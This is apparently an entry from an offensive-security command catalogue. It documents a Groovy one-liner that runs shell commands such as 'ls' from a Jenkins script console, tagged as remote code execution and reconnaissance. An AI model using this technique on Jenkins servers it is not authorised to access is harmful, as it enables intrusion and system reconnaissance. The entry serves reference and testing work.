---
id: cmd-groovy-ls
data: println "ls".execute().text
tags:
  - rce
  - recon
type: command
output: null
executor: groovy
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:32.534Z'
verified: false
validated: true
submitted: true
---
# groovy-ls-execute

## Command

```groovy
println "ls".execute().text
```

## Description

This Groovy command executes the 'ls' shell command to list directory contents within a Jenkins script console, demonstrating OS command injection for reconnaissance.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `"ls"` | The shell command string to execute | Yes |
| `.execute()` | Spawns the command as a process | Yes |
| `.text` | Captures the process output as a string | Yes |
| `println` | Outputs the result to the console | Yes |

## Examples

### Basic Usage

```groovy
println "ls".execute().text
```

### Advanced Usage

```groovy
println "ls -la".execute().text
```

## Expected Output

A string containing the listing of files and directories in the current working directory, e.g., "file1.txt\ndir1\nfile2.sh".

## Related

- [[commands/groovy-whoami-execute]]
- [[procedures/Execute-OS-Commands-via-Groovy]]
